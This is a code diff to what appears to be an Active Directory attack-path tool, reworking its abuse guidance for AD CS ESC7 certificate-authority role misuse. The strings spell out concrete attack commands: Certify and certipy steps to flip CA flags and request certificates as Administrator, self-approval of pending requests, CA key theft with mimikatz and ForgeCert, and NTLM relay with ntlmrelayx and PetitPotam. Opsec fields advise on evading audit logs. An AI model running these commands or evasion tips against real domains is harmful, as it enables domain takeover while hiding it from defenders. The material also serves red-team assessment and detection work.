@@ -2116,6 +2116,14 @@ _ABUSE = {
         "windows": "Az PowerShell / Azure CLI with the principal's token or creds; for MS Graph app roles (e.g. RoleManagement.ReadWrite.Directory), grant yourself privileged roles directly via Graph calls.",
         "linux": "Azure CLI / ROADtools / Graph REST with the stolen token or service-principal secret.",
         "opsec": "Entra sign-in and audit logs capture token use, role assignments and key reads; use tokens from an IP and user-agent consistent with the principal's normal behavior."},
+    "esc7_manager": {
+        "windows": "CA manager role. Direct paths: grant yourself the officer role and manage/approve requests, publish or enable templates, or edit CA config — Certify.exe manage-ca --ca CA --esc6 flips EDITF_ATTRIBUTESUBJECTALTNAME2 (may need a CertSvc restart), which makes every template SAN-spoofable (the ESC6 condition); then Certify request /altname:Administrator.",
+        "linux": "certipy ca -ca CANAME with manager rights: -enable-template, or config edits (EDITF / security-extension flips), then certipy req -upn administrator@DOMAIN.",
+        "opsec": "CA configuration changes and issued certs log 4886/4887 — Certified Pre-Owned detections watch exactly this role. Snapshot config before changing it and restore after issuance."},
+    "esc7_officer": {
+        "windows": "CA officer role: approve pending/denied requests (the PREVENT4 path). Request a cert for a privileged identity — it fails to pending — then force-issue: Certify manage-ca --issue-id ID + request-download with the saved key, or PSPKI Get-PendingRequest | Approve-CertificateRequest. Officer rights also allow injecting an issuance-policy OID into a pending request (ESC13-style group membership).",
+        "linux": "certipy req a cert for the target identity (fails to pending), then certipy ca -ca CANAME -issue-request ID to approve your own request.",
+        "opsec": "Approval events log 4887; deny-then-approve sequences are anomalous. Submit, approve once, move on — don't browse the request queue."},
     "golden_cert": {
         "windows": "Steal the CA private key on the CA host (mimikatz dpapi::capi / SharpDPAPI certificates), then forge certs offline with ForgeCert.exe.",
         "linux": "certipy ca -backup to extract the CA key over the CA's RPC interface, then certipy forge to mint certs for any identity.",
@@ -2240,10 +2248,6 @@ _ESC_ABUSE = {
         "windows": "EDITF_ATTRIBUTESUBJECTALTNAME2 set on the CA: request ANY template with Certify /altname:Administrator.",
         "linux": "certipy req any published template with -upn administrator@DOMAIN — the CA honors the SAN regardless of template flags.",
         "opsec": "SAN abuse on a flag-misconfigured CA is identical in telemetry to ESC1 — altname/UPN mismatch is the detection."},
-    7: {
-        "windows": "ManageCA: Certify.exe manage-ca --ca CA --esc6 (flips EDITF_ATTRIBUTESUBJECTALTNAME2, may need a CertSvc restart), then request any template with /altname. ManageCertificates: submit a request that fails to pending, then Certify manage-ca --issue-id ID + request-download with the saved key — or approve via PSPKI Approve-CertificateRequest.",
-        "linux": "certipy ca -ca CANAME -issue-request ID to approve a pending request; manager rights additionally allow config edits (-enable-template, security-ext/EDITF flips) for ESC6-style follow-up.",
-        "opsec": "CA config changes + issuance events (4886/4887) — role abuse on the CA itself is well covered by Certified Pre-Owned detections. Snapshot config, change, restore."},
     8: {
         "windows": "Relay coerced NTLM to the web enrollment endpoint — stage ntlmrelayx through SOCKS from a foothold; coerce DCs with SpoolSample.",
         "linux": "ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController -smb2support, plus PetitPotam/Coercer against the DC.",
@@ -2311,7 +2315,15 @@ def abuse_for(title, f):
             return _ABUSE["ntauth"]
         m = re.match(r"ESC(\d+)", name)
         if m:
-            return _ESC_ABUSE.get(int(m.group(1)))
+            n_esc = int(m.group(1))
+            if n_esc == 7:
+                # role-specific guidance — the finding detail names the role
+                if "ManageCA on" in detail:
+                    return _ABUSE["esc7_manager"]
+                if "ManageCertificates" in detail:
+                    return _ABUSE["esc7_officer"]
+                return None
+            return _ESC_ABUSE.get(n_esc)
         return None
     if title == "GPO Control":
         return _ABUSE["gpo"] if "--" in name else None
